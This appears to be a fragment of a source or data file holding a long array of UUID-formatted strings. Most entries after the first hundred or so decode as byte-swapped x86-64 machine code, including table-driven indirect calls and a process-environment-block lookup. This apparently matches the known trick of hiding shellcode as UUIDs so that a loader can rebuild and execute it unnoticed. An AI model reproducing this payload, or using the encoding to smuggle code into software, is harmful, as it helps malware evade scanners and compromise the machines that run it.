        "853ebc2c-8077-43fd-0b26-0f9aa5350bcf",
        "74a71e76-7ef9-4c38-bba6-ab486c7b9cd4",
        "57528bc9-0c32-a193-0704-4dcbf3ce1609",
        "1ff5a028-e74f-52e1-a600-207d93ed9174",
        "d66b959d-9795-c487-bdaf-f2b613c1dc84",
        "1a195642-1242-f422-fff9-a593896ccb60",
        "68b7e9bd-bea4-80f4-ce72-b51c62fb9baf",
        "4d816e10-ddb7-49db-13eb-1ec420b6e5a9",
        "7be632ae-113a-07fb-e678-907f65e4d558",
        "12682880-5609-ecb8-d713-3e41d7840458",
        "9ee39497-80e9-0413-d33f-3053fc81c0a4",
        "b4f1f59c-312d-e437-73df-4a6cbd1cdbfc",
        "1cdd9fe0-2aa4-7a4d-733f-dcd4606b645f",
        "75b26091-26e4-8121-3f02-e61a417080b0",
        "6b322c61-82e0-0719-3c8a-4868c47eec07",
        "920df397-bfb1-52bd-cfa3-2d84d0f215e1",
        "23bd2fd8-9ea7-c5e3-55a2-fcd0b1b78886",
        "81887596-98da-96d2-9355-75de9c484e27",
        "573a08b1-f803-adee-1caf-13f658bd07c3",
        "64e7ca4b-be9b-00a0-6fa3-0e1592349e66",
        "99904fa6-cd2c-8e50-28d8-74673f116d2a",
        "fa15375d-f541-b452-cb0f-6774dffbc643",
        "27a4cbca-49e9-9a6d-c5bf-0b24e531f2c6",
        "f74c26a9-86a7-1688-41a6-79669bdc1a44",
        "649bebae-e45b-4e2c-1dd9-6b4eb3e05a76",
        "6daba430-bd9a-8f7c-9d0d-e33a37318e73",
        "d9eb460e-3b83-3546-1878-0d1150342d4d",
        "2abb5845-9239-bf65-8547-90a564f89eb9",
        "ab95de60-090e-df5c-46e9-211050dd335d",
        "16cbc734-67bc-b126-2eba-34abe2974aed",
        "ec385f2b-ae46-c271-8ffb-54a7c234a4b4",
        "4ca427e6-95d3-441f-f33b-da19acb2a73c",
        "2286192a-2ed3-715b-7de2-e011ecd90a9c",
        "ff28be7b-e748-ec74-5e9b-7fbf80f9453e",
        "1a2ded5f-ce85-2eb1-dab4-ead1e3c1240c",
        "e17750fe-bb84-aace-7939-9c0e6e72a8cd",
        "f5a88966-2845-0eab-13a8-03d8ec02999d",
        "1bf09432-32aa-90a3-ed5c-7f43f9e2dd95",
        "860b2c30-d9f9-a0fc-e187-3fe5fe2765a5",
        "2c988e36-c244-83f2-36fc-ac7bd214d36b",
        "c744b65e-a347-74cb-62e2-8bbfa7a092c4",
        "439983fb-52c2-aea9-705c-505bcef0374d",
        "bc4be2ad-2b42-e33f-2da2-85fa481b5136",
        "f662c244-9b97-9075-80c4-2e4660d8b1a2",
        "06e87ca4-a25d-b663-cda3-74a0fb4f6c78",
        "28efa80d-b440-4ddf-127d-e672014b10db",
        "b72fd51a-74c5-f772-fc40-20bc4710119a",
        "4b4642de-f6d7-f020-98c4-df5d0df66130",
        "105decf1-8831-b914-5d6f-a537556bd954",
        "1992f09c-54a5-7be7-fa27-715dffda6024",
        "b81be840-8d92-c008-6b22-f016039feddf",
        "6044ab7b-f3ce-0d55-5e5c-f229bedf25ed",
        "012836dd-30ec-24d1-4c5c-1373624a764d",
        "a2e80138-4269-be78-dc47-ad85060d2837",
        "671f43de-ae95-e688-84b0-b58b1e59cd3e",
        "b7be7cdc-f3fa-42d9-f8f4-5f7a7f819636",
        "176b8f20-ba21-de6a-7628-1ad88ffaa15c",
        "0c0c15bc-3cdf-7dfb-f7cc-68348ad76dcd",
        "988ed85e-b223-e9e7-37b6-ebf913e21624",
        "d8ea5091-6304-648b-dda5-50d3792f0e11",
        "9cf70334-9211-7413-e1b9-130428eaf2cb",
        "7d25a6d3-0942-3f21-049e-d6b455c37b42",
        "336d73bb-c2f8-0296-370c-9aa49ccdcf57",
        "02069142-30d4-8308-6a3c-a84e75134f6f",
        "2633701f-af21-038c-b9df-6d4e2c16d97f",
        "379ee4da-d858-2513-4f29-74599109c955",
        "abc21e04-142f-650c-cd88-14604c71f176",
        "8d009a41-31c7-70f6-5672-8936df443968",
        "658d2be9-95da-7275-df28-3b2d0efa45de",
        "94aadad5-cca5-15bb-c259-bb32ed9bf746",
        "57afb5eb-6d92-e28f-445e-096601370a47",
        "f6adb304-e50b-ec28-85e9-7860ca1f289d",
        "1931101f-455c-c223-391e-6c829133dd13",
        "763e9a9a-7a05-4a5b-eca6-0d42209541b1",
        "a28919c1-8ba7-dfb2-faff-1475cd240496",
        "e1249ae4-e50d-6486-9666-87792b036c1f",
        "44fcb626-8574-c8f2-8d4f-fffb1d2e275e",
        "80f5d4bd-ee6b-c270-cb4c-ea9ebb9fdd7c",
        "2ba448ce-1632-0b7a-91a1-11724222838b",
        "dfee1f24-dad5-b62b-97d5-ca0470fa5d5a",
        "8176f480-6146-a771-a57c-e036a938ef9b",
        "fc036906-3b71-5bd5-46b3-31429d78d9df",
        "7471c55c-b025-907d-9244-41c4c3b57ce1",
        "82258ae5-5730-3fa6-7682-67d8c66466dc",
        "8f32eacf-1897-8eed-24a0-93171ea5397c",
        "61846f9e-cc08-7338-c282-78d1bff9c123",
        "a56b719a-ee5a-eaa9-88d0-dc8461aef1b4",
        "139adba0-398e-e76c-3202-e9398567b0aa",
        "4da69394-67b5-1a08-03ee-5c5e041d4742",
        "b92f4fcf-bc27-b5bc-e54b-08be5f5f41d9",
        "a8c8608a-c2e1-ff8b-2b1a-1277ac695f42",
        "68a7aaad-b5e7-95ad-2928-61670f1ae314",
        "83c406df-718f-7825-3ab0-da111ffce079",
        "4737c9ca-7174-21d9-a3db-a35be6af31a8",
        "29965e9e-e816-5653-c097-7ea912068f54",
        "a7fa450d-2a03-53dc-a43d-43e522fc1f97",
        "8e5971ee-5110-37e8-39f3-0c908139a00f",
        "51ded9a1-3b78-5ee0-444c-80a9fd1c550d",
        "bc04f18c-ca63-0350-8f3e-4f2324664b23",
        "8450d6a7-62f9-c1af-f71e-91d1b8ce7cd4",
        "bae1a0aa-a7c5-8011-d22d-ff5e9c69f4c5",
        "8dd96439-6c86-a3af-237d-6778dead44f7",
        "1f810cb4-2cba-4414-3b1f-1b92730492e1",
        "55842089-7229-65c3-3df4-d098b73295bc",
        "e2988135-95de-8e38-f81a-357925d039d3",
        "af19f8f1-b60c-92a8-660b-81bd65096071",
        "b6aa6b1a-96c5-fbce-d173-79a8cf3a5405",
        "24880fff-13cf-0244-9204-dfb49c317854",
        "15fc9170-c8a5-3c05-40eb-87b691503a87",
        "2de9e596-8cc3-c1cd-02aa-192b959de664",
        "677666e3-6ff2-725a-cce3-535befe5b553",
        "f69e2817-5a3a-727b-a005-e4cfbf541595",
        "01634f04-cb16-c9b4-a50f-08adbc769f3b",
        "012e9540-59d5-65f2-4d53-b71e175e807f",
        "356b60c0-792c-dff6-ed2f-cd0f6c190a8d",
        "783ebeae-dd06-af7a-965d-61d686bb7e7f",
        "16c94851-dfd6-0351-ba17-b023a517646b",
        "427a13ff-63ee-66c3-b91f-23f5ac52e288",
        "d22c408d-b7bc-97f2-930f-d148608c4483",
        "6cbc9051-546a-7376-d2b8-3d714bab9ace",
        "697da08b-cf63-ffa7-4189-cbac55d240df",
        "88f8a07d-fc20-36b5-d205-f8939c6235dd",
        "ff56e487-54fb-ac13-e964-253f610588ff",
        "e5bbb061-6328-b717-e75e-e320b71712ac",
        "cafc3742-21e6-de03-c297-5dd3a1046344",
        "9b0ad98b-7483-6271-1aae-18eca0bba675",
        "e669e7dc-000e-4e4a-c774-a780a9f4c5c9",
        "c5b59bc7-59e8-c031-480f-887b34000048",
        "51f0e483-8948-245c-0848-896c24104889",
        "57182474-5641-5741-4881-ec0005000033",
        "d98b48ff-b939-0238-0000-0f84ce000000",
        "28418b4c-8b48-8891-0000-00e8342e0000",
        "0fc08548-af84-0000-0048-217c24284c8d",
        "00137705-2100-247c-204c-8bcb33d233c9",
        "8b4cd0ff-2843-8b48-cb48-8b9308020000",
        "e8f88b48-2dfc-0000-4c8b-4328488bcb48",
        "00a0938b-0000-8b4c-f0e8-e62d00004c8b",
        "8b482843-48cb-938b-a800-0000488bf0e8",
        "00002dd0-c933-8b48-e8ff-53404c8bf84d",
        "4f74f685-8548-74f6-4a48-85ed7445c744",
        "000b6024-0010-d5ff-488b-c8488d542430",
        "838bd6ff-0238-0000-488d-4c24304883a4",
        "0000c824-f000-0349-c733-d24889842428",
        "41000001-d6ff-0beb-4883-c8ffeb08e8c9",
        "48000012-c78b-8d4c-9c24-00050000498b",
        "8b49205b-286b-8b49-7330-498be3415f41",
        "ccc35f5e-fff0-0841-8b41-08c3b8014000",
        "ccccc380-854d-75c0-06b8-03400080c34c",
        "4910498b-818b-0830-0000-483b02750d49",
        "0838818b-0000-3b48-4208-7419498b81f0",
        "48000008-023b-1775-498b-81f808000048",
        "7508423b-490a-0889-f0ff-410833c0c349",
        "b8002083-4002-8000-c3cc-cccc83c8fff0",
        "0841c10f-c8ff-ccc3-33c0-c3cc48895c24",
        "6c894808-1024-8948-7424-18574883ec20",
        "41f98b49-e88b-8b48-f141-f6c002741b48",
        "50245c8b-8548-74db-1c48-8b4938488b01",
        "480850ff-468b-4838-8903-40f6c501741c",
        "75ff8548-b807-4003-0080-eb12488d5e28",
        "48038b48-cb8b-50ff-0848-891f33c0488b",
        "4830245c-6c8b-3824-488b-7424404883c4",
        "ccc35f20-5340-8348-ec20-488b4158488b",
        "7850ffda-0389-c033-4883-c4205bc3cccc",
        "53c48b48-8348-60ec-8360-2000488d48b8",
        "00186083-8b48-83da-6010-0033d2448d42",
        "31bee840-0000-8b48-0348-8d542420488b",
        "1850ffcb-c085-1e75-488b-034c8d4c2478",
        "24848d4c-0080-0000-488b-cb488d942488",
        "ff000000-2050-c033-4883-c4605bc3cccc",
        "4dc88b4d-c085-0675-b803-400080c34c8b",
        "8b495841-3080-0008-0048-3b02750d498b",
        "00083880-4800-423b-0874-19498b80e008",
        "3b480000-7502-4916-8b80-e8080000483b",
        "09750842-8949-f009-ff41-08eb24498b80",
        "000008f0-3b48-7502-1b49-8b80f8080000",
        "08423b48-0e75-8d48-4110-498901f0ff41",
        "c3c03318-8349-0021-b802-400080c3cccc",
        "24448b48-8330-0020-33c0-c3cc0fafca8b",
        "ccccc3c1-8b48-2444-2883-200033c0c3cc",
        "c311048d-8948-245c-1855-565741564157",
        "20ec8348-8d48-5491-0300-00488bd9e891",
        "48000028-f08b-8548-c075-0ab801000000",
        "0000e7e9-4c00-838d-c805-00004533c948",
        "8b48d68b-e8cb-2952-0000-488be84885c0",
        "00c4840f-0000-8d48-3d8f-ffffff4c8d3d",
        "ffffff7c-2b41-0fff-88ad-0000004c8d4c",
        "d78b5024-b841-0040-0000-448bf7488bc8",
        "856053ff-0fc0-8f84-0000-00448bc7498b",
        "cd8b48d7-2be8-0030-0044-8b4424504c8d",
        "4158244c-d68b-8b48-cdff-53604c8d83d8",
        "45000005-c933-8b48-d648-8bcbe8db2800",
        "f08b4800-8548-74c0-5148-8d3d30ffffff",
        "1d358d4c-ffff-41ff-2bfe-783e4c8d4c24",
        "41d78b50-40b8-0000-008b-ef488bc8ff53",
        "74c08560-4425-c78b-498b-d6488bcee8c1",
        "4400002f-448b-5024-4c8d-4c24588bd548",
        "53ffce8b-e960-ff11-ffff-33c0488b5c24",
        "c4834860-4120-415f-5e5f-5e5dc3cccccc",
        "245c8948-4818-7489-2420-574883ec2048",
        "0368918d-0000-8b48-d9e8-662700004c8d",
        "0005e883-4500-c933-488b-d0488bcbe839",
        "48000028-f88b-8548-c074-42be01000000",
        "244c8d4c-8b30-48d6-8bc8-448d463fff53",
        "74c08560-4828-938d-0c06-0000448bc648",
        "2de8cf8b-002f-4400-8b44-24304c8d4c24",
        "48d68b38-cf8b-53ff-608b-c6eb0233c048",
        "40245c8b-8b48-2474-4848-83c4205fc3cc",
        "56535540-4157-4154-5541-564157488dac",
        "fffd8824-48ff-ec81-7803-00004533ff48",
        "2144f98b-d8bd-0002-0048-8d4c246033d2",
        "00bbf633-6003-4504-8d77-68458bc6e8e1",
        "b900002e-0104-0000-4489-742460894d80",
        "60858d48-0001-4800-8944-24784c8d4c24",
        "b04d8960-8d48-5045-4889-45a88d4e4048",
        "89d0458d-904d-8948-4588-33d2488d4510",
        "48a04d89-8f8d-0924-0000-4889459841b8",
        "10000000-97ff-0148-0000-4533f685c00f",
        "0003d584-8300-247c-7404-b80033e00445",
        "8944e68b-2474-4120-0f94-c40f44d84533",
        "c03345c9-d233-c933-ff97-500100004889",
        "48582444-c085-840f-9e03-0000440fb745",
        "958d4884-0160-0000-4c89-7424384533c9",
        "24748944-4830-c88b-c744-242803000000",
        "2474894c-ff20-5897-0100-004889442448",
        "48e88b4c-c085-840f-0303-0000443975b0",
        "c7660675-5045-002f-4c89-7424384c8d45",
        "245c8950-4530-c933-4c89-74242833d248",
        "894cc88b-2474-ff20-9780-0100004c8bf0",
        "0fc08548-ba84-0002-0045-85e474260fba",
        "20730ce3-b941-0004-0000-c74424508033",
        "8d4c0000-2444-4850-8bc8-418d511bff97",
        "00000160-8b44-904d-33db-4585c974124c",
        "8d88458b-1c53-8b49-ceff-97600100008b",
        "4d8b44f0-45a0-c985-7414-4c8b4598ba1d",
        "49000000-ce8b-97ff-6001-00008bf04533",
        "245c89c9-4520-c033-33d2-498bceff9788",
        "85000001-0fc0-2f84-0200-004c8d8dd002",
        "85c70000-02d0-0000-0400-00004c8d85d8",
        "48000002-5c89-2024-ba13-000020498bce",
        "019097ff-0000-c085-0f84-fc01000081bd",
        "000002d8-00c8-0000-0f85-ec0100004c8d",
        "0002d08d-c700-d085-0200-00080000004c",
        "02c0858d-0000-9d89-c002-0000ba050000",
        "5c894820-2024-8b49-ceff-979001000085",
        "ee850fc0-0000-ff00-97e8-0000003d762f",
        "850f0000-01a2-0000-4533-c9899dc00200",
        "c0334500-8d48-c895-0200-00498bceff97",
        "00000178-c085-840f-7e01-000041bc0100",
        "8d8b0000-02c8-0000-85c9-0f8493000000",
        "d8978b48-0000-4d00-85ff-75158bd9ffd2",
        "44c88b48-c38b-8b41-d4ff-97c8000000eb",
        "c09d8b1c-0002-0300-d9ff-d2488bc8448b",
        "c78b4dcb-8b41-ffd4-97d0-00000033db4c",
        "8548f88b-0fc0-1f84-0100-008b95c00200",
        "4c8d4c00-4024-8b44-85c8-0200004803d0",
        "ffce8b49-6897-0001-008b-85c802000048",
        "02c8958d-0000-8501-c002-00004533c945",
        "8b49c033-ffce-7897-0100-0085c00f855f",
        "4cffffff-af8d-00d8-0000-4d85ff0f84c2",
        "eb000000-8b5c-c085-0200-0085c00f84b7",
        "4c000000-af8d-00d8-0000-8bd841ff5500",
        "0001bc41-0000-8b44-c348-8bc8418bd4ff",
        "0000c897-3300-4cdb-8bf8-4885c00f8482",
        "44000000-858b-02c0-0000-4c8d4c244048",
        "5c89d08b-4024-8b49-ceff-97680100008b",
        "c0858bf0-0002-8500-c074-5a33c98bd041",
        "003000b8-4400-498d-04ff-574848898760",
        "4800000d-c085-1774-448b-85c002000049",
        "8b48d78b-e8c8-2b2a-0000-418bf4eb028b",
        "858b44f3-02c0-0000-33d2-498bcfe8322b",
        "ff410000-0055-8b4d-c741-8bd4488bc8ff",
        "0000e097-4c00-6c8b-2448-498bceff9770",
        "49000001-cd8b-97ff-7001-00004533f648",
        "58244c8b-97ff-0170-0000-85f6744883bf",
        "00000234-7503-483f-8b9f-600d0000488d",
        "000d4897-4400-8f8b-580d-0000488d8f38",
        "4c00000d-c38b-dde8-2600-00488b572848",
        "0c2c8f8d-0000-8de8-2500-00483b831805",
        "0f410000-f645-c68b-eb02-33c04881c478",
        "41000003-415f-415e-5d41-5c5f5e5b5dc3",
        "4cc48b48-4889-4c20-8940-184889480855",
        "41575653-4154-4155-5641-57488da8b8fe",
        "8148ffff-08ec-0002-004c-63723c488bda",
        "16848b41-0088-0000-85c0-0f8497000000",
        "023c8d48-778b-8518-f60f-848800000044",
        "330c478b-8bc9-2047-4c03-c2448b671c48",
        "8b44c203-246f-034c-e248-898558010000",
        "41ea034c-008a-c084-7414-33d2ffc10c20",
        "f0154488-d18b-8a42-0401-84c075eec644",
        "4900f00d-d18b-8d48-4df0-e8c924000048",
        "20244489-8b48-5885-0100-008d4eff488b",
        "00016895-8b00-44f1-8bf9-8b0c884803cb",
        "0024a3e8-4800-4433-2420-483b85600100",
        "851a7400-75f6-33cd-c048-81c408020000",
        "5e415f41-5d41-5c41-5f5e-5b5dc3430fb7",
        "45007d44-048b-4c84-03c3-4c3bc70f82aa",
        "41000000-848b-8c1e-0000-004803c74c3b",
        "96830fc0-0000-4500-33d2-458bca453810",
        "83411f74-3cf9-1973-418b-c1428a0c0088",
        "8030044c-2ef9-0974-41ff-c14738140175",
        "418d41e1-8b01-c6d0-4404-3064418d4102",
        "300444c6-416c-418d-03c6-4404306c418d",
        "8d4e0441-020c-8844-5404-30418bd24538",
        "83177411-7ffa-1273-8bca-ffc2428a0409",
        "700c4488-3846-0a14-75e9-488b8d500100",
        "4c8d4c00-7024-c28b-4c8d-442430488bd3",
        "04548844-e870-000e-0000-4c8bc0498bc0",
        "ffff24e9-ccff-cccc-488b-c44889580848",
        "48106889-7089-4818-8978-2041564883ec",
        "8b486520-2504-0030-0000-4533db498bf1",
        "48f08b4d-ea8b-8b48-f94c-8b5060498b42",
        "588b4818-4c10-5b39-3074-2e4d85db754a",
        "30538b48-3b48-74d5-1145-33c94c8bc648",
        "35e8cf8b-0021-4c00-8bd8-488b1b48837b",
        "d7750030-854d-75db-2149-8bd6488bcfe8",
        "00002030-8548-74c0-0e48-8bd6488bc8ff",
        "8b4c3857-ebd8-4503-33db-488b5c243049",
        "8b48c38b-246c-4838-8b74-2440488b7c24",
        "c4834848-4120-c35e-4053-4883ec20488b",
        "8b48304a-48da-c985-740b-488b01ff5010",
        "30638348-4800-4b8b-3848-85c9740b488b",
        "1050ff01-8348-3863-0048-8b4b284885c9",
        "8b480b74-ff01-1050-4883-632800488b4b",
        "c9854810-2674-8b48-0148-8b5320ff90a0",
        "48000000-4b8b-4810-8b01-ff5058488b4b",
        "018b4810-50ff-4810-8363-1000488b4b20",
        "74c98548-480b-018b-ff50-104883632000",
        "184b8b48-8548-74c9-0b48-8b01ff501048",
        "00186383-8b48-084b-4885-c9740b488b01",
        "481050ff-6383-0008-488b-0b4885c9740a",
        "ff018b48-1050-8348-2300-4883c4205bc3",
        "2041fff0-418b-c320-488b-4910458bd14c",
        "30244c8b-8b49-45d0-8bc2-488b0148ff60",
        "cccccc50-8948-245c-0857-4883ec20498b",
        "f98b48d9-854d-75c9-07b8-03400080eb13",
        "10498b48-8b48-ff01-5008-488b47104889",
        "48c03303-5c8b-3024-4883-c4205fc3cccc",
        "75d28548-b806-4003-0080-c3c702010000",
        "c3c03300-8348-48ec-488b-842490000000",
        "48d98b4c-498b-4410-8bc2-440fb74c2470",
        "48d38b49-4489-3824-488b-842488000000",
        "48118b4c-4489-3024-488b-842480000000",
        "24448948-4828-448b-2478-488944242041",
        "485852ff-c483-c348-4889-5c2408488974",
        "48571024-ec81-0240-0000-488b02488bf9",
        "310d8d48-0002-4800-8bda-488908488d0d",
        "ffffff0c-8b48-4802-8948-08488d0da602",
        "8b480000-4802-4889-1048-8d0d50ffffff",
        "48028b48-4889-4818-8d0d-06ffffff488b",
        "48894802-4820-0d8d-dcfe-ffff488b0248",
        "48284889-0d8d-ff3a-ffff-488b02488948",
        "0d8d4830-f3a0-ffff-488b-024889483848",
        "f3260d8d-ffff-8b48-0248-894840488d0d",
        "fffff318-8b48-4802-8948-48488d0d0af3",
        "8b48ffff-4802-4889-5048-8d0dfcf2ffff",
        "48028b48-4889-4858-8d0d-eef2ffff488b",
        "48894802-4860-0d8d-ec01-0000488b0248",
        "48684889-0d8d-f2d2-ffff-488b02488948",
        "0d8d4870-f2c4-ffff-488b-024889487848",
        "f2b60d8d-ffff-8b48-0248-898880000000",
        "a50d8d48-fff2-48ff-8b02-488988880000",
        "0d8d4800-f294-ffff-488b-024889889000",
        "8d480000-830d-fff2-ff48-8b0248898898",
        "48000000-0d8d-f272-ffff-488b02488988",
        "000000a0-8d48-610d-f2ff-ff488b024889",
        "0000a888-4800-0d8d-50f2-ffff488b0248",
        "00b08889-0000-8d48-0d3f-f2ffff488b02",
        "b8888948-0000-4800-8d0d-2ef2ffff488b",
        "88894802-00c0-0000-488d-0d5501000048",
        "8948028b-c888-0000-0048-8b02488d0d09",
        "c7fffff2-2444-0028-0100-00488988d000",
        "8d4c0000-1987-0006-0048-8b02488d0de9",
        "41fffff1-c983-48ff-8988-d8000000488d",
        "fff1d70d-48ff-028b-4889-88e000000048",
        "f1c60d8d-ffff-8b48-0248-8988e8000000",
        "24448d48-8330-2062-0033-c948897a2833",
        "448948d2-2024-57ff-7048-8d5308488d4c",
        "97ff3024-0140-0000-85c0-7515488b4b08",
        "10438d4c-8d48-c097-0800-00488b01ff50",
        "9c8d4c30-4024-0002-0049-8b5b10498b73",
        "e38b4918-c35f-cccc-4c8b-c94d85c07506",
        "004003b8-c380-8b48-4928-488b81300800",
        "023b4800-0d75-8b48-8138-080000483b42",
        "48327408-818b-0840-0000-483b02750d48",
        "0848818b-0000-3b48-4208-7419488b81c0",
        "48000008-023b-1375-488b-81c808000048",
        "7508423b-4d06-0889-33c0-c349832000b8",
        "80004002-ccc3-cccc-4883-ec28488b4918",
        "45c93345-c033-fdba-ffff-ff488b01ff50",
        "48c03370-c483-c328-83c8-fff00fc14120",
        "ccc3c8ff-8348-28ec-488b-41288bcaff50",
        "48c03368-c483-c328-4889-5c2408574881",
        "0000a0ec-4800-fa8b-488d-99700400008a",
        "c9334503-3345-84c0-c074-56488d542420",
        "48cb8b48-d32b-3b3c-741b-4981f8800000",
        "88127d00-0a04-ff41-c148-ffc149ffc08a",
        "75c08401-4de1-c085-7427-4963c9488bd7",
        "42c1ff48-44c6-2004-0048-03d9488d4c24",
        "234ae820-0000-c085-75a5-b801000000eb",
        "48c03302-9c8b-b024-0000-004881c4a000",
        "c35f0000-5340-8348-ec50-33db488bc24c",
        "8548c98b-74d2-4437-8d43-30488bc8488d",
        "41202454-51ff-8358-f830-7522817c2440",
        "00001000-1475-7c81-2448-00000200750a",
        "44247c83-7504-8d03-58d1-8bc3eb0233c0",
        "50c48348-c35b-cccc-4889-5c241048896c",
        "57561824-5441-5641-4157-4881ec300200",
        "898b4c00-01a0-0000-33c0-4533e4498bf0",
        "48ea8b48-f98b-bf41-0001-00004d85c90f",
        "00009a84-4800-918d-6008-00004881c150",
        "41000008-d1ff-c085-0f88-ba000000488d",
        "44302444-7c89-2824-4c8d-450c48894424",
        "c9834120-33ff-33d2-c9ff-5770488b0e48",
        "4c085e8d-878d-0870-0000-4c8bcb488d54",
        "8b483024-ff01-1850-85c0-783c488b0b48",
        "6024948d-0002-4800-8b01-ff505085c078",
        "a4394437-6024-0002-0074-20488b0b4c8d",
        "8d4c104e-9087-0008-0048-8d9780080000",
        "ff018b48-4850-03eb-4c21-2385c078094c",
        "01a0a739-0000-2175-488d-461033d24c8d",
        "0008908f-4800-4489-2420-4c8d87800800",
        "ffc93300-9897-0001-0085-c079104c2166",
        "e9c03310-0145-0000-4c21-26ebcb488b4e",
        "018b4810-50ff-8550-c00f-882b0100004c",
        "010c858d-0000-8d4c-7618-453820751248",
        "49104e8b-d68b-8b48-01ff-5068448bf8eb",
        "448d4848-3024-8944-7c24-284183c9ff48",
        "20244489-d233-c933-ff57-70488d4c2430",
        "013097ff-0000-8b48-4e10-4d8bce4533c0",
        "48d08b48-d88b-8b4c-1141-ff5260488bcb",
        "fff88b44-3897-0001-0045-85ff0f88b800",
        "8b490000-480e-978d-a008-00004c8d4620",
        "ff018b48-8510-0fc0-889d-0000008b8524",
        "4c000005-848d-7824-0200-004421a4247c",
        "b9000002-0011-0000-8984-24780200008d",
        "97fff051-0100-0000-488b-d84885c0746a",
        "10438b4c-c033-8539-2405-000076158a8c",
        "00052828-4200-0c88-00ff-c03b85240500",
        "48eb7200-4e8b-4c20-8d46-28488bd3488b",
        "6890ff01-0001-8500-c048-8b4310410f94",
        "39d233c4-2495-0005-0076-16c6842a2805",
        "c6000000-0204-ff00-c23b-952405000072",
        "cb8b48ea-97ff-0118-0000-418bc44c8d9c",
        "00023024-4900-5b8b-3849-8b6b40498be3",
        "5e415f41-5c41-5e5f-c3cc-cccc48895c24",
        "6c894810-1824-5756-4154-415641574881",
        "000180ec-4c00-418b-2848-8bd9488b5148",
        "001a7fe8-4c00-438b-2848-8bcb488b5350",
        "e8e08b4c-1a6c-0000-4c8b-4328488bcb48",
        "01e8938b-0000-8b4c-f8e8-561a0000488b",
        "e4854de8-3074-854d-ff74-2b4885c07426",
        "c933138b-b841-3000-0000-448d490441ff",
        "f88b48d4-8548-75c0-2c83-bb3002000002",
        "c9330475-d5ff-c883-ff4c-8d9c24800100",
        "5b8b4900-4938-6b8b-4049-8be3415f415e",
        "5e5f5c41-44c3-038b-488b-d3488bcfe871",
        "3300001f-48d2-4c8d-2430-448d4240e881",
        "8300001f-34bf-0002-0003-4c8d7728753a",
        "4c0f8b44-878d-023c-0000-4181e93c0200",
        "578d4800-4814-4f8d-04e8-6a1b0000498b",
        "8f8d4816-0c2c-0000-e81b-1a0000483b87",
        "00000d30-850f-0255-0000-4d8b06488bcf",
        "30578b48-8be8-0019-0048-8947304885c0",
        "ff60840f-ffff-8d48-9f40-0200008a0333",
        "74c084d2-333b-3cc9-3b74-1781fa040100",
        "ff0f7300-88c2-0c44-708b-ca8a041a84c0",
        "d285e575-1a74-4a8d-01c6-441470004803",
        "548d48d9-7024-8b48-cfe8-a6160000ebbd",
        "000001be-3900-3cb7-0200-0076334d8b06",
        "8bcf8b48-48de-548b-df30-e81519000048",
        "30df4489-8548-75c0-0d48-3987a0010000",
        "01b9850f-0000-c6ff-3bb7-3c02000072cd",
        "0920878b-0000-f883-0275-1f488bcfe85d",
        "41ffffef-01be-0000-0085-c00f84940100",
        "9f8b4800-0d60-0000-eb23-41be01000000",
        "0f03f883-7c84-0001-0048-8d9f600d0000",
        "74c63b41-4808-9c8b-24b0-0100004439b7",
        "00000570-3274-8b48-cfe8-56edffff85c0",
        "bf830d75-0570-0000-020f-844601000048",
        "69e8cf8b-ffee-85ff-c075-0d83bf700500",
        "840f0200-012d-0000-4439-73080f84ad00",
        "938b0000-0524-0000-33c9-4881c22f1500",
        "00b84100-0030-4800-81e2-00f0ffff448d",
        "ff410449-48d4-f08b-4885-c00f84f40000",
        "30b84100-0005-4800-8bd3-488bc8e8a21d",
        "438b0000-8d08-fd48-413b-ce761a83f802",
        "8d485d75-2896-0005-0048-8d8b28050000",
        "001b03e8-eb00-4445-8b83-240500004c8d",
        "0005288b-0f00-c8b7-488d-962805000066",
        "b8ce2b41-0100-0000-660b-c8488d8424b0",
        "48000001-4489-2824-8b83-200500008944",
        "97ff2024-0200-0000-85c0-7579488bde8b",
        "fd418d0b-3b41-76c6-508d-41ff413bc676",
        "fb418d15-3b41-77c6-4b48-8bd3488bcfe8",
        "00000fa8-3eeb-8d4c-4424-30488bd3488b",
        "fa62e8cf-ffff-c085-7410-4c8d44243048",
        "8b48d38b-e8cf-009e-0000-488d54243048",
        "d1e8cf8b-fff4-ebff-0b48-8bd3488bcfe8",
        "000004b4-bf83-0230-0000-037508ebfe41",
        "000001be-8b00-2087-0900-00be00c00000",
        "4102e883-c63b-3177-488b-8f600d000048",
        "2574c985-8b44-5887-0d00-0033d2e8b21c",
        "8b480000-608f-000d-0044-8bc633d241ff",
        "a78348d7-0d60-0000-0044-8b0733d28b9f",
        "00000230-8b48-e8cf-881c-0000448bc633",
        "cf8b48d2-ff41-83d7-fb02-750433c9ffd5",
        "b2e9c033-fffc-ccff-4889-5c2408555657",
        "55415441-5641-5741-488d-ac24e0fdffff",
        "20ec8148-0003-4500-33ed-33c0833a020f",
        "8b4dc057-4cf0-6c89-2450-488bf2488945",
        "7d8d4588-6601-8944-ad68-020000488bd9",
        "0ffd8b41-4411-7824-0f85-f0010000498b",
        "8d492848-3850-8b48-01ff-908000000085",
        "ce880fc0-0001-4900-8b4e-38488d542450",
        "ff018b48-9090-0000-0085-c00f88860300",
        "4c8b4800-5024-8d4c-4424-48418bd7ff93",
        "00000120-8b48-244c-504c-8d442444418b",
        "2893ffd7-0001-8b00-4424-442b44244841",
        "840fc703-0126-0000-418d-4d0c458bc733",
        "0893ffd2-0001-4c00-8d86-0c04000033d2",
        "45f88b48-2838-840f-a000-0000488d4510",
        "0100bf41-0000-8944-7c24-284183c9ff33",
        "448948c9-2024-53ff-7048-8d542440488d",
        "93ff104d-00f8-0000-448b-442440b90820",
        "89660000-244c-3360-d241-8d4d084c8bf8",
        "010893ff-0000-8948-4424-684489ad7802",
        "39440000-246c-7640-3b41-8bcd458d6501",
        "cf0c8b49-93ff-0130-0000-488b4c246848",
        "0278958d-0000-8b4c-c0ff-93100100008b",
        "0002788d-4100-cc03-898d-780200003b4c",
        "cc724024-bf41-0001-0000-eb46b9082000",
        "c78b4500-8966-244c-60b9-08000000ff93",
        "00000108-8d48-688d-0200-004489ad7802",
        "89480000-2444-ff68-9330-010000488b4c",
        "8d486824-7895-0002-004c-8bc0ff931001",
        "8d4c0000-2444-4460-89ad-78020000488d",
        "00027895-4800-cf8b-ff93-10010000498b",
        "8d4c384e-d84d-0ff2-104d-88488d55a066",
        "247c8944-4c78-c78b-4c89-6d800f104424",
        "018b4878-0ff2-4d11-b00f-2945a0ff9028",
        "48000001-ff85-840f-eb01-0000488b4c24",
        "1893ff68-0001-4800-8bcf-ff9318010000",
        "0001d2e9-4d00-6e89-38e9-c90100004c8d",
        "00020c82-4100-00bf-0100-00488d451044",
        "28247c89-8341-ffcc-4889-442420458bcc",
